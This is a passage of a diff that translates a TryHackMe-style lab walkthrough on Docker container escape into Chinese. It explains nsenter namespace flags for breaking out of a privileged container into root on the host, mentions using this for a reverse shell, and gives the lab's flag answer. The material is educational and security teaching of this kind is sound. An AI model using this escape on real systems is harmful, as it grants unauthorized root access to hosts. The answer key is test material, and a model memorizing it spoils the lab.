+2. 指定 `--mount`，这是我们提供目标进程的挂载命名空间的地方。 "如果未指定文件，则进入目标进程的挂载命名空间。" ([Man.org., 2013](https://man7.org/linux/man-pages/man1/nsenter.1.html))。
 
-3. The `--uts` switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services).
+3. `--uts` 开关允许我们与目标进程共享相同的 UTS 命名空间，意味着使用相同的主机名。 这很重要，因为主机名不匹配可能导致连接问题（尤其是网络服务）。
 
-4. The `--ipc` switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared.
+4. `--ipc` 开关意味着我们进入进程的进程间通信命名空间，这很重要。 这意味着可以共享内存。
 
-5. The `--net` switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host).
+5. `--net` 开关意味着我们进入网络命名空间，意味着我们可以与系统的网络相关功能交互。 例如，网络接口。 我们可以使用这个来打开一个新的连接（例如在主机上的稳定反向 shell）。
 
-6. As we are targeting the "**/sbin/init**" process #1 (although it's a symbolic link to "**lib/systemd/systemd**" for backwards compatibility), we are using the namespace and permissions of the [systemd](https://www.freedesktop.org/wiki/Software/systemd/) daemon for our new process (the shell)
+6. 由于我们目标是 "**/sbin/init**" 进程 #1（尽管它是 "**lib/systemd/systemd**" 的符号链接以保持向后兼容性），我们正在使用 [systemd](https://www.freedesktop.org/wiki/Software/systemd/) 守护进程的命名空间和权限来运行我们的新进程（shell）
 
-7. Here's where our process will be executed into this privileged namespace: `sh` or a shell. This will execute in the same namespace (and therefore privileges) of the kernel.
+7. 这是我们的进程将被执行到这个特权命名空间的地方：`sh` 或一个 shell。 这将在内核的同一命名空间（因此也是权限）中执行。
 
-You may need to "**Ctrl + C**" to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container and can look around the host OS (showing the change in hostname)
+您可能需要按 "**Ctrl + C**" 一次或两次来取消此漏洞的利用，但如下所示，我们已经逃逸了 docker 容器，并且可以查看主机操作系统（显示主机名的变化）
 
 ---
 
@@ -455,13 +455,13 @@ root@demo-container:~# hostname
 thm-docker-host
 ```
 
-Success! We will now be able to look around the host operating system in the namespace as root, meaning we have full access to anything on the host!
+成功！ 我们现在将能够在命名空间中作为 root 查看主机操作系统，这意味着我们拥有对主机上任何内容的完全访问权限！
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Perform the exploit in this task on the target machine. **What is the flag located in /home/tryhackme/flag.txt?** </summary>
+<summary> 在目标机器上执行此任务中的利用。 **位于 /home/tryhackme/flag.txt 的标志是什么？** </summary>
 
 ```plaintext
 THM{YOUR-SPACE-MY-SPACE}
@@ -471,21 +471,21 @@ THM{YOUR-SPACE-MY-SPACE}
 
 :::
 
-## Task 7 Conclusion
+## 任务 7 结论
 
-Phew...that was fun! In today's room, you learned about some possible misconfigurations with Docker containers, how to discover these, and ultimately exploit them.
+呼...这很有趣！ 在今天的房间中，您了解了 Docker 容器可能存在的一些错误配置，如何发现这些配置，并最终利用它们。
 
-Now, you might be wondering why it is the case that containers might run with privileges that effectively bypass the security mechanisms Docker introduces. Well, while it isn't a recommended practice, there are use cases where containers do need this level of interaction. For example, running Docker within Docker, or specific applications such as firewalls that need to interact with the host's iptables, or perhaps attached devices.
+现在，您可能想知道为什么容器可能以有效绕过 Docker 引入的安全机制的权限运行。 嗯，虽然这不是推荐的做法，但在某些用例中容器确实需要这种级别的交互。 例如，在 Docker 中运行 Docker，或者需要与主机的 iptables 或可能连接的设备交互的特定应用程序，如防火墙。
 
-Ultimately, there is also an element of "taking the quick/easy route out" when trying to figure out what permissions to assign a container. Docker (especially in recent times) does a great job of hardening. For example, you can give a container specific capibilities on a allowlist-basis.  However, it isn't too far-fetched to think that people would just give more than necessary capabilities to get something to work without realising the wider consequences.
+最终，在尝试确定分配给容器的权限时，也存在“采取快速/简单途径”的因素。 Docker（尤其是在最近）在加固方面做得很好。 例如，您可以在允许列表的基础上为容器授予特定能力。  然而，人们为了在不意识到更广泛后果的情况下使某些东西工作而给予超过必要的能力，这并非太牵强。
 
-We will come onto how you can prevent these misconfigurations and vulnerabilities in the next **room**, "Container Hardening"
+我们将在下一个**房间**“容器加固”中讨论如何防止这些错误配置和漏洞。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Click me to finish the room! </summary>
+<summary> 点击我完成房间！ </summary>
 
 ```plaintext
 No answer needed
